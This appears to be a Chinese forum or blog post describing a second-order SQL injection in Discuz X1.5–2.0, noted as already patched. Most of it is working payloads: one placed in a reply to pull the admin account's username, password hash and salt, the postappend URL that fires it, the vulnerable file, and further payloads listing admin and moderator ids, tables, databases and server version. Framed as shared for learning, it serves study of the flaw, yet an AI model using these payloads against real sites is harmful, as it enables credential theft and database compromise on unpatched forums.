@@ -1,0 +1,26 @@
+Discuz 1.5 - 2.0 二次注入细节(已出补丁)
+By：jannock
+
+    今天才发现，discuz 昨天又出补丁了。唉，又少一个玩了。这里说一下细节让大家共同学习一下吧。
+
+    在发表回复的地方输入注入语句：
+a',`subject`=(/*!select*/ concat(username,'|',password,'|',salt) from pre_ucenter_members where uid=1 limit 0,1),comment='
+然后到回复补充那里随便补充一下，注入语句就被执行。
+
+补充的地址：
+
+    forum.php?mod=misc&tid={tid}&action=postappend&pid={pid}
+
+    上面的语句就会把取得的内容写进回复主题返回。
+
+漏洞文件：source\module\forum\forum_misc.php
+
+其他补充：
+',`subject`=(/*!select*/ group_concat(uid,':') from pre_common_member where groupid=1),comment='  //查看管理用户
+',`subject`=(/*!select*/ group_concat(uid,':') from pre_common_member where groupid=2),comment='  //超级版主
+',`subject`=(/*!select*/ group_concat(uid,':') from pre_common_member where groupid=3),comment='  //超级版主
+',`subject`=(/*!select*/ table_name from information_schema.tables where table_schema=0x0000 limit 0,1),comment='//跑表
+',`subject`=(/*!select*/ group_concat(schema_name) from information_schema.schemata),comment='  //获取所有库
+',`subject`=(/*!select*/ concat(@@version,':',user(),':',database())),comment='  //版本信息 
+
+收藏 分享 00 0 顶 踩 
